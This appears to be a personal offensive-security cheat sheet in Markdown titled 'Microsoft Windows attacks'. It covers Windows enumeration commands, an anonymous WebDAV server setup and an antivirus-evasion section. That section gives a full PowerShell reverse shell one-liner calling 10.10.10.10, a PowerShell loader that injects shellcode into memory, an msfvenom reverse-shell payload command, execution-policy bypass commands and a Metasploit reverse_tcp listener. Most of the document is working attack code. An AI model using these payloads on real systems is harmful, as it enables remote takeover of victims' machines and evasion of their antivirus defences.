# Microsoft Windows attacks

## Cmd

```
forfiles /P C:\Windows /S /M *.txt /c "cmd /c echo @PATH"
find /c /v "" file.txt
net user
net localgroup
```

## WebDAV

```
pip install wsgidav
mkdir mywebdav
.local/wsgidav --host=0.0.0.0 --auth=anonymous --port 80 --root ./mywebdav
```

## AV evasion

### Powershell reminder

#### Basics

Get help:
```
Get-Help somecommand
Get-Command -ParameterName ComputerName
Get-Command -name "*name*"
```

Find file:
```
Get-ChildItem -Path C:\ -Include *.extension -File -Recurse -ErrorAction SilentlyContinue
```

Base64: https://stackoverflow.com/questions/15414678/how-to-decode-a-base64-string
```
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("somebase64string"))
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("sometext"))
```

#### Powershell reverse shell one-liner

- source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
- command:
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- base64: https://github.com/darkoperator/powershell_scripts/blob/master/README

### Powershell memory injection

Memory injection types:
- https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
- https://blog.f-secure.com/memory-injection-like-a-boss/

#### Script

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc =
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = someshellcode;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

Shell code:
```
kali$ msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
```

#### Execution policy

See ByPass: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3

##### At system level

```
Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

##### At script level

```
PS> powershell -ep bypass ./somescript.ps1
```

## Shellter

Project: https://www.shellterproject.com/

Metasploit listener:
```
kali$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
```



